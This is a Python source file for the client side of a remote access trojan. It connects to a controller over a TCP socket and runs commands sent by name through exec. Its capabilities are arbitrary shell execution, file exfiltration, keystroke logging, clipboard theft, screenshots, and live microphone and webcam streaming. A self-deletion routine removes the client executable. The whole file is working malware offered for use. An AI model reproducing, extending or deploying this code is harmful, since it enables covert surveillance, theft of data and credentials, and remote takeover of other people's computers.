import os
import pickle
import platform
import socket
import subprocess

import cv2
import keyboard
import pyaudio
import pyautogui
import win32clipboard


class Client:

    def __init__(self, host, port):
        tcp = socket.SOCK_STREAM
        afm = socket.AF_INET
        self.client_socket = socket.socket(afm, tcp)
        self.client_socket.connect((host, port))

        print("Connected successfully!\n")

        while True:
            self.client_socket.settimeout(None)
            data = self.client_socket.recv(1024).decode()
            if data == "EXIT":
                break
            exec(f"self.{data}()")
        self.client_socket.close()

    def sys_info(self):
        self.client_socket.send(str(platform.uname()).encode())
        return

    def cmd(self):
        while True:
            command = self.client_socket.recv(1024).decode()
            if command == 'exit':
                self.client_socket.send(subprocess.getoutput('exit').encode())
                break
            self.client_socket.send(subprocess.getoutput(f'{command}').encode())
        return

    def show_files(self):
        self.client_socket.send(str(platform.uname()).encode())
        command = self.client_socket.recv(1024).decode()
        self.client_socket.send(subprocess.getoutput(f'{command}').encode())
        return

    def copy_file(self):
        file_name = self.client_socket.recv(1024).decode()
        filesize = os.path.getsize(file_name)
        self.client_socket.send(str(filesize).encode())
        with open(file_name, "rb") as f:
            bytes_read = f.read(filesize)
            self.client_socket.send(bytes_read)
        return

    def delete_file(self):
        self.client_socket.send(str(platform.uname()).encode())
        deleted = self.client_socket.recv(1024).decode()
        resp = subprocess.getoutput(f'{deleted}')
        if resp:
            self.client_socket.send(resp.encode())
        else:
            self.client_socket.send('Deleted successfully!'.encode())
        return

    def show_process(self):
        self.client_socket.send(str(platform.uname()).encode())
        command = self.client_socket.recv(1024).decode()
        self.client_socket.send(subprocess.getoutput(f'{command}').encode())
        return

    def input_capture(self):
        while True:
            record = keyboard.record(until='Enter')
            self.client_socket.sendall(pickle.dumps(record))
            cont = self.client_socket.recv(1024).decode()
            if cont.lower() == "no":
                break
        return

    def clipboard_data(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        self.client_socket.send(data.encode())

    def make_screenshot(self):
        screenshot = pyautogui.screenshot()
        self.client_socket.sendall(pickle.dumps(screenshot))

    def audio_capture(self):
        self.client_socket.settimeout(0)
        CHUNK = 1024 * 4
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        while True:
            data = stream.read(CHUNK)
            self.client_socket.send(data)
            try:
                self.client_socket.recv(1024).decode()
                stream.stop_stream()
                break
            except:
                pass

    def video_capture(self):
        self.client_socket.settimeout(None)
        cap = cv2.VideoCapture(0)
        while cap.isOpened():
            ret, frame = cap.read()
            data = pickle.dumps(cv2.imencode('.jpg', frame)[1])
            self.client_socket.send(data)
            self.client_socket.settimeout(0)
            try:
                self.client_socket.recv(1024).decode()
                break
            except:
                pass

    def sinkhole(self):
        info = str(platform.uname())
        self.client_socket.send(info.encode())
        self.client_socket.close()
        if "Windows" in info:
            os.popen("del client.exe")
        else:
            os.popen("rm -rf client.exe")
        exit(0)


if __name__ == '__main__':
    host = socket.gethostbyname(socket.gethostname())
    port = 5050

    process = Client(host, port)
